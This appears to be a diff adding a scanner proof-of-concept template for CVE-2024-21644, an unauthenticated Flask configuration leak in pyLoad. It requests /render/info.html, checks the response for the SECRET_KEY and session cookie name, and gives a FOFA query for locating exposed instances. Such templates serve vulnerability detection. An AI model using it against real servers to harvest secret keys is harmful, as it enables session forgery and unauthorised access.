@@ -1,0 +1,21 @@
+id: poc-yaml-pyload-flask-config-access-control
+info:
+  name: pyLoad 未经身份验证的 Flask 配置泄漏 (CVE-2024-21644)
+  severity: high
+  tags:
+  - CVE-2024-21644
+  - 信息泄露
+  finger: payload
+  fofa: title="Compte - pyLoad Interface web"
+requests:
+- method: GET
+  path: /render/info.html
+  expression: 'status_code == 200 &&
+
+    contains(body,"''SECRET_KEY'':") &&
+
+    contains(body,"''pyload_session''")
+
+    '
+variables: {}
+transport: http
